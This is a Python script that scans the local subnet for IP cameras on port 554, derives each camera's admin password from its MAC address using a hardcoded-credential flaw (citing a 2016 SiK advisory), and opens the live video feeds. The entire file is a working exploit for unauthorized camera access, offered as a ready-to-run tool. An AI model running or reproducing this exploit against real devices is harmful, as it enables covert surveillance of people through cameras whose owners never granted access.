import re
import cv2
import base64
import socket
import subprocess
import itertools

MY_HOSTNAME = socket.gethostname()
MY_IP_ADDR = socket.gethostbyname(MY_HOSTNAME)
BASE_ADDR = '.'.join(MY_IP_ADDR.split('.')[:-1])

RTSP_PORT = 554
SOCKET_TIMEOUT = 0.01
ARP_MAC_RE = re.compile(r'((?:[0-9a-f][0-9a-f]-){5}[0-9a-f]{2})')
RTSP_ENDPOINTS = [
    "/live/0/h264.sdp",
    "/live_mpeg4.sdp",
    "/live_h264_1.sdp",
    "/live/0/onvif.sdp",
    "/live_h264.sdp",
    "/live_mpeg4_1.sdp",
    "/live/0/mpeg4.sdp",
    "/ch0_0.h264",
    "/video.h264",
    "/Streaming/Channels/1",
]


def check_connection(ip_address, username, password, endpoint=''):
    basic_auth = base64.b64encode(f'{username}:{password}'.encode()).decode()
    req = f'DESCRIBE rtsp://{username}:{password}@{ip_address}{endpoint} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {basic_auth}\r\n\r\n'.encode()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip_address, 554))
    sock.sendall(req)
    data = sock.recv(1024)
    return data.decode()

def find_mac_address(ip_address):
    arp_command = ['arp', '-a', ip_address]
    output: str = subprocess.check_output(arp_command).decode()
    mac_address: str = ARP_MAC_RE.findall(output)[0].replace('-', ':')
    return mac_address.upper()

def find_hostname(ip_address):
    return socket.gethostbyaddr(ip_address)[0]

def find_rtsp_password(ip_address):
    """ See https://team-sik.org/sik-2016-045/ """
    mac_address = find_mac_address(ip_address)
    modified_mac = mac_address.replace(':', '')[::-1]
    password_raw = f"LUCKOTVF{modified_mac}YCAMVF"
    password_encoded = base64.b64encode(password_raw.encode()).decode()
    return password_encoded

def open_stream(ip_address, username, password):
    for endpoint in itertools.cycle(RTSP_ENDPOINTS):
        rtsp_url = f'rtsp://{username}:{password}@{ip_address}{endpoint}'
        
        print(f'🔗 Connecting to', rtsp_url)

        connection_check = check_connection(ip_address, username, password, endpoint)
        if '404 Not Found' in connection_check:
            print('⛔ 404: Could not find', endpoint)
            continue
        elif '200 OK' in connection_check:
            print('✅ Connection successful | [1] - Next Steam | [ESC] - Next Camera')
        else:
            print('❓ Unknown response', connection_check)
        
        stream = cv2.VideoCapture(rtsp_url)
        
        while stream.isOpened():
            # Read the input live stream
            ret, frame = stream.read()
            height, width, layers = frame.shape
            frame = cv2.resize(frame, (width , height ))

            # Show video frame
            cv2.imshow(f'{ip_address}/{endpoint}', frame)
            # Quit when 'x' is pressed
            keypress = cv2.waitKey(1)
            if keypress & 0xFF == ord('1'):
                cv2.destroyWindow(f'{ip_address}/{endpoint}')
                break
            if keypress & 0xFF == 27:
                cv2.destroyWindow(f'{ip_address}/{endpoint}')
                return

def find_rtsp_ips() -> list[str]:
    """ Scan the network for ip_addresses with an open rtsp port"""
    rtsp_ips = [] 
    print('🔎 Scanning...')
    for ip_index in range(0, 255):
        ip_addr = f'{BASE_ADDR}.{ip_index}'

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(SOCKET_TIMEOUT)
        exitcode = sock.connect_ex((ip_addr, RTSP_PORT))
        sock.close()
        if not exitcode:
            print('📷 Found', ip_addr)
            rtsp_ips.append(ip_addr)
    return rtsp_ips

if __name__ == '__main__':
    username = 'admin'
    rtsp_ips = find_rtsp_ips()
    for ip_address in rtsp_ips:
        password = find_rtsp_password(ip_address)
        response = check_connection(ip_address, username, password)
        if 'Unauthorized' in response:
            print('🔒 Auth failed for', ip_address)
            continue
        print('🔑 Auth success!')
        open_stream(ip_address, 'admin', password)

    if rtsp_ips:
        print('👋 No more cameras!')
    else:
        print('👋 No cameras found!')
